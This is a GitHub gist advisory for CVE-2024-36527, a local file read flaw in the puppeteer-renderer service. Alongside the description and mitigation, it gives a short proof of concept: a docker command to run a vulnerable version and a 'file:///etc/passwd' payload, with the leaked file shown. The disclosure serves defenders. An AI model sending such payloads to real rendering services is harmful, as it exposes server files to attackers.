
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911&source=header-gist)

[Sign¬†in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911) [Sign¬†up](/join?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@7a6163](https://avatars.githubusercontent.com/u/579103?s=64&v=4)](/7a6163)

# [7a6163](/7a6163)/**[CVE-2024-36527.md](/7a6163/25fef08f75eed219c8ca21e332d6e911)** Secret

Last active
June 21, 2024 07:40

Show Gist options

* [Download ZIP](/7a6163/25fef08f75eed219c8ca21e332d6e911/archive/72bc1288e39cc780a81a87ff6b819101e5408e11.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/7a6163/25fef08f75eed219c8ca21e332d6e911.js&quot;&gt;&lt;/script&gt;
* Save 7a6163/25fef08f75eed219c8ca21e332d6e911 to your computer and use it in GitHub Desktop.

[Code](/7a6163/25fef08f75eed219c8ca21e332d6e911)
[Revisions
4](/7a6163/25fef08f75eed219c8ca21e332d6e911/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/7a6163/25fef08f75eed219c8ca21e332d6e911.js&quot;&gt;&lt;/script&gt;

Save 7a6163/25fef08f75eed219c8ca21e332d6e911 to your computer and use it in GitHub Desktop.

[Download ZIP](/7a6163/25fef08f75eed219c8ca21e332d6e911/archive/72bc1288e39cc780a81a87ff6b819101e5408e11.zip)

CVE-2024-36527

 [Raw](/7a6163/25fef08f75eed219c8ca21e332d6e911/raw/72bc1288e39cc780a81a87ff6b819101e5408e11/CVE-2024-36527.md)

[**CVE-2024-36527.md**](#file-cve-2024-36527-md)

## Vulnerability in puppeteer-renderer Service

**CVE ID:** CVE-2024-36527

**Description:**

puppeteer-renderer is a service that can render web pages using Puppeteer. There is a vulnerability in this service where the `url` parameter is not validated to restrict it to only `http` or `https` protocols. This allows an attacker to use the `file` protocol to perform a path traversal attack.

**Impact:**

An attacker can exploit this vulnerability to read arbitrary files on the server, potentially gaining access to sensitive information.

**Affected Versions:**

puppeteer-renderer versions prior to 3.3.0.

**Mitigation:**

Users should update to version 3.3.0 or later where this issue has been addressed. Additionally, ensure that input validation is implemented to restrict the `url` parameter to only `http` and `https` protocols.

**Proof of Concept:**

The following example demonstrates how an attacker can exploit this vulnerability:

1. Start server using docker:

```
docker run -d --name renderer -p 8080:3000 ghcr.io/zenato/puppeteer-renderer:v3.2.0
```

2. Payload:

```
http://localhost:8080/html?url=file:///etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
pptruser:x:999:999::/home/pptruser:/bin/sh
```

**References:**

* [zenato/puppeteer-renderer#97](https://github.com/zenato/puppeteer-renderer/issues/97)
* <https://github.com/zenato/puppeteer-renderer/releases/tag/v3.3.0>

**Reported by:**

Zac Wang

[![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=80&v=4)](/cfi-gb)

Copy link

### **[cfi-gb](/cfi-gb)** commented [Jun 21, 2024](/7a6163/25fef08f75eed219c8ca21e332d6e911?permalink_comment_id=5096012#gistcomment-5096012)

```
Affected Versions:

puppeteer-renderer versions prior to 3.2.0.

```

probably should be:

```
Affected Versions:

puppeteer-renderer versions prior to 3.3.0.

```

right so that it matches the:

```
Users should update to version 3.3.0

```

?

Sorry, something went wrong.

[![@7a6163](https://avatars.githubusercontent.com/u/579103?s=80&v=4)](/7a6163)

Copy link

Author

### **[7a6163](/7a6163)** commented [Jun 21, 2024](/7a6163/25fef08f75eed219c8ca21e332d6e911?permalink_comment_id=5096022#gistcomment-5096022)

[@cfi-gb](https://github.com/cfi-gb)

You‚Äôre right, I have corrected it. Thank you!

Sorry, something went wrong.

[![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=80&v=4)](/cfi-gb)

Copy link

### **[cfi-gb](/cfi-gb)** commented [Jun 21, 2024](/7a6163/25fef08f75eed219c8ca21e332d6e911?permalink_comment_id=5096025#gistcomment-5096025)

Thanks a lot üëç

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2F7a6163%2F25fef08f75eed219c8ca21e332d6e911)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.

